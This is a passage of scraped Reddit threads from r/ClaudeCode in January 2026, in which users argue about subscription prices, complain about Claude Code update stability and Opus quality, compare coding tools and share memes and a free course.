          "author": "RedditSellsMyInfo",
          "text": "Yes please can we just have a stickied thread or a weekly thread?",
          "score": 1,
          "created_utc": "2026-01-16 00:33:39",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzu70dv",
          "author": "KingPonzi",
          "text": "This post is the equivalent of the â€œit smell like broke in hereâ€ meme.",
          "score": 1,
          "created_utc": "2026-01-16 01:21:02",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzxer75",
              "author": "BootyMcStuffins",
              "text": "There are plenty of places for broke people to post about being broke.",
              "score": 1,
              "created_utc": "2026-01-16 14:44:11",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzttoss",
          "author": "Radiant-Chipmunk-239",
          "text": "Agree. Max sub, shipping constantly. After 20 years writing code the hard way, this is the tool I wished existed. If you're hitting limits in an hour, you're probably prompting like you're interrogating it. \n\nCodex is great if you like waiting in a queue to submit homework.Â ",
          "score": 0,
          "created_utc": "2026-01-16 00:07:56",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nztrfoa",
          "author": "stampeding_salmon",
          "text": "It is extremely expensive, and nobody is posting about the strawman you just created but you. \n\nI rate your post 0 stars.",
          "score": -9,
          "created_utc": "2026-01-15 23:55:44",
          "is_submitter": false,
          "replies": [
            {
              "id": "nztv8tu",
              "author": "krullulon",
              "text": "Your comment is rated -7 stars ðŸ¤£",
              "score": 3,
              "created_utc": "2026-01-16 00:16:22",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nztwjcz",
                  "author": "stampeding_salmon",
                  "text": "![gif](giphy|uRxRLxPbtKf28)",
                  "score": -1,
                  "created_utc": "2026-01-16 00:23:23",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nztu517",
              "author": "keithslater",
              "text": "Hire a developer to the same amount of work and see what expensive is.",
              "score": 1,
              "created_utc": "2026-01-16 00:10:24",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nztupiu",
          "author": "SignificantAsk4215",
          "text": "![gif](giphy|fXnRObM8Q0RkOmR5nf)",
          "score": -3,
          "created_utc": "2026-01-16 00:13:29",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzv4nx9",
          "author": "Traditional_Ad6043",
          "text": "Totally agree. Itâ€™s crazy to me that people arenâ€™t willing to pay $200 to 10x their productivity.",
          "score": 0,
          "created_utc": "2026-01-16 04:35:43",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzvie3x",
          "author": "IndraVahan",
          "text": "I agree. These posts donâ€™t really add a lot of value. But on the other hand, it can still also be a fair concern with billing or in general Claude being relatively more expensive than other models. Weâ€™ll take this discussion up among mods.",
          "score": 0,
          "created_utc": "2026-01-16 06:13:00",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzwukze",
          "author": "WSATX",
          "text": "Get real mate, if you think that the subject is unsubstantial and \"that part\" of the community is wrong, maybe you don't really get it.",
          "score": 0,
          "created_utc": "2026-01-16 12:55:26",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qbyfwj",
      "title": "sometimes the simplest solution is the best solution!",
      "subreddit": "ClaudeCode",
      "url": "https://i.redd.it/zwwzvj5yp5dg1.png",
      "author": "Pristine_Shelter_28",
      "created_utc": "2026-01-13 18:07:33",
      "score": 105,
      "num_comments": 29,
      "upvote_ratio": 0.78,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Humor",
      "permalink": "https://reddit.com/r/ClaudeCode/comments/1qbyfwj/sometimes_the_simplest_solution_is_the_best/",
      "domain": "i.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "nze5g8g",
          "author": "HotSince78",
          "text": "I've got a new account with chatgpt, chatting with it a lot until they give me another free plus account for a month",
          "score": 8,
          "created_utc": "2026-01-13 18:16:42",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzg9itr",
              "author": "VanillaSwimming5699",
              "text": "I have to have plus for my job, and Gemini pro, and Claude pro, so I get to try them all! Claude code is still just better lol. Although knowledge cutoff is an issue, especially for opus ive found. Maybe itâ€™s just because itâ€™s so good at everything else that when it has an issue with knowledge cutoff (next.js 16 for example) itâ€™s glaring.",
              "score": 1,
              "created_utc": "2026-01-14 00:20:42",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzg9lha",
                  "author": "VanillaSwimming5699",
                  "text": "Also have cursor pro",
                  "score": 1,
                  "created_utc": "2026-01-14 00:21:06",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzgpzmb",
              "author": "ECrispy",
              "text": "how exactly do you get free plus?",
              "score": 1,
              "created_utc": "2026-01-14 01:53:06",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nziqcfa",
                  "author": "HotSince78",
                  "text": "I told you in the comment, read it again",
                  "score": -2,
                  "created_utc": "2026-01-14 11:08:57",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzh45pv",
              "author": "Perfect-Series-2901",
              "text": "do they?",
              "score": 1,
              "created_utc": "2026-01-14 03:13:15",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzhantl",
              "author": "Lucky_Yam_1581",
              "text": "Ha ha tats the way! I use it only for web search and deep research",
              "score": 1,
              "created_utc": "2026-01-14 03:52:29",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzffd1u",
          "author": "thermal_Randomness",
          "text": "This is the only way",
          "score": 3,
          "created_utc": "2026-01-13 21:46:41",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzf59nx",
          "author": "1millionbucks",
          "text": "was this meme made with gemini",
          "score": 2,
          "created_utc": "2026-01-13 20:59:59",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzly529",
              "author": "yksugi",
              "text": "No it was made in Figma by hand (I made it)",
              "score": 1,
              "created_utc": "2026-01-14 20:58:13",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzfnfap",
          "author": "BagComprehensive79",
          "text": "For me only problem was usage limits. How is the current situation? I saw a lot of â€œlimits are decreased after Christmas giftâ€ posts here, is it still an issue?",
          "score": 2,
          "created_utc": "2026-01-13 22:24:42",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzg3wcf",
              "author": "Suspicious-Edge877",
              "text": "Were increased and fine with the Opus 4.5 Release and since 2026 they kinda suck dick, but mostly because of the claude code Bug I think.",
              "score": 1,
              "created_utc": "2026-01-13 23:50:27",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzg7ug7",
              "author": "flarpflarpflarpflarp",
              "text": "Maybe for lower tiers, but the higher tiers was more intermittent connection issues and then having to figure out how to navigate them.Â  There were slow ping times and slow response rates, I'd guess bc a ton of usage, but i didn't hit anything that seemed like usage limit.",
              "score": 1,
              "created_utc": "2026-01-14 00:11:39",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzj1wu2",
          "author": "_number",
          "text": "Opencode has free models, doesnt need $100 a month sub",
          "score": 2,
          "created_utc": "2026-01-14 12:37:09",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzj86mh",
          "author": "Nabugu",
          "text": "well since Anthropic cracked down on Opencode's CC auth and OpenAI opened its own auth to Opencode, OpenAI is my new friend now :)",
          "score": 2,
          "created_utc": "2026-01-14 13:17:23",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzfavqb",
          "author": "amarao_san",
          "text": "Nope. Codex is better. Less junk in the system prompt, don't try to please me instead of doing the work.",
          "score": 5,
          "created_utc": "2026-01-13 21:26:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzg2vc2",
              "author": "Apprehensive-Ant7955",
              "text": "Only thing claude code is better at is DX. no hooks sucks. Statusline is a nice thing to have. \n\nClaude code + hooks for your workflow makes development feel very fun, codex is very â€œgo do X and then i have to periodically check to see you arenâ€™t stuck on a user prompt or permission issueâ€",
              "score": 1,
              "created_utc": "2026-01-13 23:44:58",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzh9gmv",
          "author": "jbcraigs",
          "text": "Claude Code is not the â€œsimplestâ€. IMO It is the most advanced under the hood.\n And the best so far. \n\nAntigravity on the other hand probably has the best vision, but not quite there yet with the execution.",
          "score": 2,
          "created_utc": "2026-01-14 03:45:06",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzmhtgs",
              "author": "Plants-Matter",
              "text": "Yeah...OP is the guy on the left and thinks he's the guy on the right. \n\nMaybe one day he'll learn how capital letters work.",
              "score": 1,
              "created_utc": "2026-01-14 22:27:55",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzfgptn",
          "author": "opi098514",
          "text": "I ainâ€™t got the money for that though",
          "score": 1,
          "created_utc": "2026-01-13 21:52:54",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzi5pti",
          "author": "Plus_Complaint6157",
          "text": "codex in vs code is enough for all",
          "score": 1,
          "created_utc": "2026-01-14 07:54:27",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzltuhp",
          "author": "Flat_Association_820",
          "text": "So you guys are web devs?",
          "score": 1,
          "created_utc": "2026-01-14 20:38:45",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzlz1n1",
          "author": "Cats4BreakfastPlz",
          "text": "lol claude code does not belong on the right hand side ðŸ¤£ if you had actually explored all the other tools you would know.",
          "score": 1,
          "created_utc": "2026-01-14 21:02:19",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzmovgv",
          "author": "hashn",
          "text": "sometimes?",
          "score": 1,
          "created_utc": "2026-01-14 23:03:12",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzo8p2k",
          "author": "Senhor_Lasanha",
          "text": "thats not right\n\nI'm in the left side and I use gemini cli",
          "score": 1,
          "created_utc": "2026-01-15 04:25:00",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzwh2li",
          "author": "tiredofmissingyou",
          "text": "CC is ok but once You go OpenCode You never come back",
          "score": 1,
          "created_utc": "2026-01-16 11:18:35",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o01285l",
          "author": "PerformanceMore8771",
          "text": "Because all roads lead to Cursor.",
          "score": 1,
          "created_utc": "2026-01-17 01:16:15",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qckp0k",
      "title": "We don't need update every day, we need a stable software",
      "subreddit": "ClaudeCode",
      "url": "https://www.reddit.com/r/ClaudeCode/comments/1qckp0k/we_dont_need_update_every_day_we_need_a_stable/",
      "author": "SoloGrooveGames",
      "created_utc": "2026-01-14 11:16:29",
      "score": 102,
      "num_comments": 55,
      "upvote_ratio": 0.86,
      "text": "I know Cursor does it and it's a popular approach in the 'AI race', but I believe most of the programmers would highly prefer a stable software instead of getting updates daily.\n\nJust in the past 7 days, we've got: random temp files littering our projects, API overload errors, auto-accept not working, bad usage tracking etc.\n\nThis is not acceptable for a production software at this scale. (especially not at a $100/mo. price point)",
      "is_original_content": false,
      "link_flair_text": "Discussion",
      "permalink": "https://reddit.com/r/ClaudeCode/comments/1qckp0k/we_dont_need_update_every_day_we_need_a_stable/",
      "domain": "self.ClaudeCode",
      "is_self": true,
      "comments": [
        {
          "id": "nzitrlp",
          "author": "branik_10",
          "text": "`\"autoUpdatesChannel\": \"stable\"`",
          "score": 25,
          "created_utc": "2026-01-14 11:37:16",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzj8yfk",
              "author": "SoloGrooveGames",
              "text": "True dat, helps with \\~70% of the issues",
              "score": 8,
              "created_utc": "2026-01-14 13:21:52",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nzislqz",
          "author": "stingraycharles",
          "text": "I donâ€™t auto-update, itâ€™s much better that way.",
          "score": 11,
          "created_utc": "2026-01-14 11:27:52",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzjcuyz",
              "author": "Kamots66",
              "text": "I've always auto-updated, but this morning I finally rolled back to 2.0.76 until 2.1.x stabilizes. I don't mind being on the bleeding edge, but I can't afford to bleed out.\n\nMost of the 2.1.x bugs were tolerable--the display bugs were quite annoying, however--but this morning I had a session that went to 177k tokens and CC 2.1.7 insisted context was full and refused to continue, even though /context showed 23k context remaining (I have auto compact turned off). This caught me off guard and I had to kill the session without being able to first perform a proper context handoff.",
              "score": 3,
              "created_utc": "2026-01-14 13:43:52",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzja7my",
              "author": "debian3",
              "text": "Iâ€™m back on 2.0.62 and it fixed the smaller limit for me. It was maybe 30-40% less on the newer version.",
              "score": 3,
              "created_utc": "2026-01-14 13:29:12",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzjn4it",
                  "author": "TheOriginalAcidtech",
                  "text": ".61 still",
                  "score": 3,
                  "created_utc": "2026-01-14 14:39:05",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nziwt96",
          "author": "bibboo",
          "text": "They proudly tell us all how much of their code is AI generated. Agents are fucking amazing. But this is the current state of where we are.Â \n\nYou are not shipping perfectly stable software with any sort of high frequency, if to much is trusted on AI.Â \n\nAnthropic is the perfect example. And no, this does not mean I hate AI, or that I donâ€™t believe in it. Justâ€¦ manage expectations, for now.Â ",
          "score": 6,
          "created_utc": "2026-01-14 12:00:39",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nziti63",
          "author": "DasHaifisch",
          "text": "Turn off auto updates or switch to the stable track.",
          "score": 5,
          "created_utc": "2026-01-14 11:35:11",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nziz2ff",
          "author": "Careful_Medicine635",
          "text": "I am on 100$/mo and i still think it's 100% worth it.. People seem to forget very quickly what kind of value are they offering..\n\nIf you use it effectively enough it literally can make you basically 2k/mo (acquiring another part time job for example)",
          "score": 5,
          "created_utc": "2026-01-14 12:17:16",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nziskhe",
          "author": "dimonchoo",
          "text": "They donâ€™t have competitors. So, ours words donâ€™t mean anything",
          "score": 7,
          "created_utc": "2026-01-14 11:27:35",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzix2u7",
              "author": "N2siyast",
              "text": "How so? Iâ€™ve found opencode to be much better experience",
              "score": 2,
              "created_utc": "2026-01-14 12:02:39",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzjb4ke",
                  "author": "Hozukr",
                  "text": "Heâ€™s probably talking about their models + subscription options. You canâ€™t use the subscription with third party tools (not without being banned).",
                  "score": 2,
                  "created_utc": "2026-01-14 13:34:19",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nzjxeci",
                  "author": "[deleted]",
                  "text": "If you want to be pwned it surely is.",
                  "score": 1,
                  "created_utc": "2026-01-14 15:29:38",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzk65re",
              "author": "rm-rf-rm",
              "text": "lmao this industry is so fickle. Yesterday cursor was all the rage, today claude code. tomorrow it will be something else",
              "score": 1,
              "created_utc": "2026-01-14 16:09:50",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nziwxgi",
              "author": "New-Artichoke-6875",
              "text": "this.",
              "score": -1,
              "created_utc": "2026-01-14 12:01:32",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzisxst",
          "author": "justinlok",
          "text": "Pretty sure you can switch to stable instead of latest version. I'm not saying it's actually stable but probably more stable that what you are experiencing. I havent had any issues on latest though.",
          "score": 7,
          "created_utc": "2026-01-14 11:30:37",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nziruxz",
          "author": "geeered",
          "text": "Oh, you still thought you were the customer, not the product?  Cute!",
          "score": 6,
          "created_utc": "2026-01-14 11:21:46",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzjabe1",
              "author": "SoloGrooveGames",
              "text": "Ouch, still hurts haha",
              "score": 2,
              "created_utc": "2026-01-14 13:29:47",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nziri12",
          "author": "Scary_Light6143",
          "text": "![gif](giphy|iHskdY9SMLFZuQ2u5c)",
          "score": 8,
          "created_utc": "2026-01-14 11:18:44",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzjb0l4",
              "author": "SoloGrooveGames",
              "text": "C'mon this is not politics, we're allowed to have opinions here",
              "score": 3,
              "created_utc": "2026-01-14 13:33:42",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "nzj12o8",
              "author": "alphaQ314",
              "text": "Couldn't have said it any better myself.",
              "score": -3,
              "created_utc": "2026-01-14 12:31:21",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nziv3hv",
          "author": "TuanCao",
          "text": "I don't use Claude Code much recently, I but I felt like codex is doing the right thing here, we only at v 0.80.0",
          "score": 1,
          "created_utc": "2026-01-14 11:47:42",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzj12q4",
          "author": "h____",
          "text": "Just don't update unless you absolutely have to. It's not needed most times.",
          "score": 1,
          "created_utc": "2026-01-14 12:31:21",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzjdib0",
          "author": "tobsn",
          "text": "canâ€™t wait for them to buy opencode",
          "score": 1,
          "created_utc": "2026-01-14 13:47:25",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzjqc8x",
          "author": "woodnoob76",
          "text": "You know you can stop the auto-updates, right?",
          "score": 1,
          "created_utc": "2026-01-14 14:55:24",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzkadsd",
          "author": "randombsname1",
          "text": "Nah im good with this pace. Every 2-3 weeks or so there seems to be a major update that I can use to further streamline my own workflows. \n\nYou can just turn off auto updating and/or jump off to a stable channel.",
          "score": 1,
          "created_utc": "2026-01-14 16:28:56",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzmi8pk",
          "author": "Evening-Advisor-4785",
          "text": "\"I've noticed that version 2.1.x unexpectedly generates a lot of hidden-like system files. Version 2.0.xx feels much more stable in comparison.\"",
          "score": 1,
          "created_utc": "2026-01-14 22:29:56",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzj5fsv",
          "author": "darko777",
          "text": "Claude Code has become really slow as of version 2.1.0 and onwards to the point where i constantly need to restart it, especially latest versions 2.1.5 and onwards are really bad compared to 2.0.76. Each new update gives me the feeling that it's becoming more bloated and slower, introduces more flashing, more resource usage, etc. The flashing bug remains unfixed for months, first reported around May 2025.\n\nSadly, even the author seems to be vibe coding it and doesn't have any control over the code they are shipping as of recent.\n\nFor now i switched to OpenCode - this is better managed from development standpoint with more quality control. Includes handy features and it works without killing my CPU and memory. It's my latest discovery and it's so much better combined with the GLM 4.7 Pro plan.",
          "score": 1,
          "created_utc": "2026-01-14 13:00:23",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzj9moh",
              "author": "SoloGrooveGames",
              "text": "I've seen OpenCode mentioned quite a few times, I'm also planning to give it a shot!",
              "score": 2,
              "created_utc": "2026-01-14 13:25:49",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nzj624r",
          "author": "Careless_Bat_9226",
          "text": "Iâ€™ve never heard more whiners than Iâ€™ve heard on this sub. Iâ€™m sorry your revolutionary AI tool is not perfectly stable at all times ðŸ˜­",
          "score": -4,
          "created_utc": "2026-01-14 13:04:22",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzjvfhj",
              "author": "IlliterateJedi",
              "text": "Yeah.  It sucks to pay hundreds of dollars a month for a product that stops being useful every other day.",
              "score": 3,
              "created_utc": "2026-01-14 15:20:21",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzjxgzk",
                  "author": "Careless_Bat_9226",
                  "text": ">stops being useful every other day.\n\nA little dramatic? I use it every day, all day for work and haven't seen this. That's kind of my point.",
                  "score": 1,
                  "created_utc": "2026-01-14 15:29:59",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzj8vh7",
              "author": "SoloGrooveGames",
              "text": "What if I pull an uno reverse and say you're gaslighting instead? I believe it's okay to form criticism, no one said it's not an amazing tool regardless.",
              "score": 2,
              "created_utc": "2026-01-14 13:21:24",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nzjj3ox",
                  "author": "Careless_Bat_9226",
                  "text": "I think you exaggerate how bad the problem is. I've used CC heavily over the past 7 days and sure there have been minor issues but minor. What do you expect in perhaps the fastest moving technical innovation in human history? Also to say \"not acceptable\" at $100 is dramatic. $100 is the steal of the century for the capabilities of CC. It's just become normalized so quickly that we take it for granted.",
                  "score": 1,
                  "created_utc": "2026-01-14 14:17:46",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nziuq85",
          "author": "jpcaparas",
          "text": "I've been affected outage on Bedrock for HOURS now. Anyone on the same boat?",
          "score": 0,
          "created_utc": "2026-01-14 11:44:51",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzitc0c",
          "author": "JustKiddingDude",
          "text": "Their product is not stable, thatâ€™s why they roll out updates. \n\nPeople ask for more features, thatâ€™s why they roll out updates. \n\nSometimes bugs creep in (if you ever developed software, youâ€™ll know that happens), thatâ€™s why they roll out updates.",
          "score": -5,
          "created_utc": "2026-01-14 11:33:49",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzj3tek",
              "author": "scholzie",
              "text": "People who develop software professionally typically donâ€™t push out slop on a daily basis because it erodes customer trust.",
              "score": 5,
              "created_utc": "2026-01-14 12:49:53",
              "is_submitter": false,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qb86r4",
      "title": "Claude Code for Everyone â€“Â 100% free course",
      "subreddit": "ClaudeCode",
      "url": "https://i.redd.it/hfizsywsmzcg1.jpeg",
      "author": "carlvellotti",
      "created_utc": "2026-01-12 21:41:03",
      "score": 95,
      "num_comments": 7,
      "upvote_ratio": 0.87,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Resource",
      "permalink": "https://reddit.com/r/ClaudeCode/comments/1qb86r4/claude_code_for_everyone_100_free_course/",
      "domain": "i.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "nz8pdvr",
          "author": "nicketnl",
          "text": "Going to check it out tomorrow, thanks!",
          "score": 2,
          "created_utc": "2026-01-12 21:59:47",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz8pw7e",
              "author": "carlvellotti",
              "text": "enjoy! very open to feedback",
              "score": 1,
              "created_utc": "2026-01-12 22:02:12",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nz90ajk",
          "author": "grumblegrim",
          "text": "Thanks! Is this all Terminal-based or do you use the desktop app?",
          "score": 1,
          "created_utc": "2026-01-12 22:53:02",
          "is_submitter": false,
          "replies": [
            {
              "id": "nz90nei",
              "author": "carlvellotti",
              "text": "Itâ€™s terminal base, specifically, I recommend cursor for the workspace. Terminal is more powerful than desktop and not that hard to use once to get used to it.",
              "score": 1,
              "created_utc": "2026-01-12 22:54:49",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nz92y9e",
          "author": "sbeeline",
          "text": "Wow! Gonna check out tmrw!",
          "score": 1,
          "created_utc": "2026-01-12 23:06:36",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz9okn6",
          "author": "Galaron",
          "text": "Can you tell claude where you want to install it? When I ran the command, it installed itself in my C:\\\\Users\\\\my name> folder. But when I type claude, nothing happens. I even asked Claude itself, and it didn't seem to have any idea what I was talking about. :-/ Sorry, not an engineer.",
          "score": 1,
          "created_utc": "2026-01-13 01:02:51",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nz9v9to",
          "author": "n8rb",
          "text": "Link?",
          "score": 1,
          "created_utc": "2026-01-13 01:39:54",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qg10p0",
      "title": "\"Where have all the good men gone?\"",
      "subreddit": "ClaudeCode",
      "url": "https://i.redd.it/1zy24f2jw1eg1.jpeg",
      "author": "dev_is_active",
      "created_utc": "2026-01-18 06:21:12",
      "score": 95,
      "num_comments": 4,
      "upvote_ratio": 0.92,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Humor",
      "permalink": "https://reddit.com/r/ClaudeCode/comments/1qg10p0/where_have_all_the_good_men_gone/",
      "domain": "i.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "o08zx6y",
          "author": "UnlimitedSoupandRHCP",
          "text": "My wife is certainly a lot more interested when I deign to emerge. She's definitely made a few jealous comments about my new lover as well.",
          "score": 9,
          "created_utc": "2026-01-18 06:30:00",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0957cq",
          "author": "cli-games",
          "text": "We thought it would be sex bots. It wasnt",
          "score": 6,
          "created_utc": "2026-01-18 07:15:50",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o099j2i",
          "author": "Fun-Rope8720",
          "text": "+1 data point",
          "score": 6,
          "created_utc": "2026-01-18 07:54:26",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0dhnvf",
          "author": "hello5346",
          "text": "Yeah what a NOT take.",
          "score": 1,
          "created_utc": "2026-01-18 22:51:53",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qeb8x4",
      "title": "Whats going on with Opus?",
      "subreddit": "ClaudeCode",
      "url": "https://www.reddit.com/r/ClaudeCode/comments/1qeb8x4/whats_going_on_with_opus/",
      "author": "frendo11",
      "created_utc": "2026-01-16 09:10:50",
      "score": 88,
      "num_comments": 78,
      "upvote_ratio": 0.86,
      "text": "Just having a moan here, sorry! I am doing some simple work on my internal dashboard, for example adding 2 new endpoint calls, and it keeps shitting the bed... It forgot to route through my proxy express server. After telling it to route trough that it just hallucinated the endpoint. What is going on? I kept reading how people are saying they have problems with Claude but i was like, naah you guys suck. But damn its happening to me as well now.... I actually tried updating to latest Claude code hoping it will be better but i dont see any improvements. At the end i just added those 2 endpoints myself, i feel like a dirt peasant now, doing all that manual work. Is this actually an indication that we might get a new model soon? ",
      "is_original_content": false,
      "link_flair_text": "Discussion",
      "permalink": "https://reddit.com/r/ClaudeCode/comments/1qeb8x4/whats_going_on_with_opus/",
      "domain": "self.ClaudeCode",
      "is_self": true,
      "comments": [
        {
          "id": "nzw5ecm",
          "author": "Sophiaphage",
          "text": "I have it take project notes in a separate file that it can call and it still cannot get things right. Itâ€™s been a constant degradation in performance since the newest Opus went public",
          "score": 15,
          "created_utc": "2026-01-16 09:35:30",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzw5msm",
              "author": "frendo11",
              "text": "I was really happy with it most of the time. Sure there was a blunder here and there but nothing on this scale.",
              "score": 3,
              "created_utc": "2026-01-16 09:37:43",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nzw6ws3",
                  "author": "martinsky3k",
                  "text": "for real.\n\nI have a super structured code base. a big project. there are docs and everything. I am doing a port, so the answer book is literally in one part of the code. Need to rewrite it to another framework... Opus would oneshot this early on at release. But now... the idiot can't even manage it even with the answer book next to him. Like... it is so much worse it is absolutely insane. It feels like anthropic just pushes down the limits to see what the crticial point of abandonment is or something.\n\nCancelled my x20 due to getting pissed off. So well played. But I guess a new Sonnet is releasing soon.",
                  "score": 0,
                  "created_utc": "2026-01-16 09:49:36",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzx19eb",
              "author": "rockum",
              "text": "Claude newbie here.  How do you that?  I have a DESIGN.md file that I first created on my own and I see Claude has added to it somewhat.",
              "score": 1,
              "created_utc": "2026-01-16 13:34:25",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzx7wg1",
                  "author": "Sophiaphage",
                  "text": "I just tell claude to make a txt file and make a detailed summary of the project or findings, then put a trigger for an agent or claude.md to pull itâ€”isnâ€™t perfect. I do the same thing on the web version on long projects",
                  "score": 1,
                  "created_utc": "2026-01-16 14:09:28",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "nzxd5qm",
                  "author": "nfactorial_work",
                  "text": "If I am doing something I know will overlap context window or extend over several sessions, I ask it to create a memory .md file (or a .txt file) and to take notes for future sessions. If I start a new session to continue work, I point it at that file first and ask Claude to keep it updated.",
                  "score": 1,
                  "created_utc": "2026-01-16 14:36:15",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzwaebd",
          "author": "rdalot",
          "text": "These last two days I felt that performance decreased drastically compared to the days before as well",
          "score": 7,
          "created_utc": "2026-01-16 10:21:18",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzwb74h",
          "author": "FBIFreezeNow",
          "text": "omg what is going on? I normally don't post about the quality but it's quite ridiculous!",
          "score": 6,
          "created_utc": "2026-01-16 10:28:30",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzx7kka",
              "author": "who_am_i_to_say_so",
              "text": "There are a lot of people complaining and it may be for a good reason. Iâ€™ve noticed a huge degradation. \n\nThere was a change pushed yesterday. I think itâ€™s related to the release.",
              "score": 2,
              "created_utc": "2026-01-16 14:07:44",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzyhgtb",
                  "author": "TheLawIsSacred",
                  "text": "Agreed \n\nI last used my Claude Desktop app (Opus 4.5) about 9 or 10 hours ago, before giving up & going to sleep - for hours, it failed to even begin to execute basically any inquiries requiring Extended Thinking (which is my default setting when I use Opus 4.5). \n\nFirst time this has happened to me - I pay $100 a month for the Max 5x subscription.\n\nPraying to God it's better this afternoon. \n\nHaving to rely on lesser frontier models was rather scary last night. \n\nEven Claude's Sonnet 4.5, which I had to turn to a couple times last night, feels noticeably deficient compared to Opus 4.5.",
                  "score": 2,
                  "created_utc": "2026-01-16 17:38:09",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
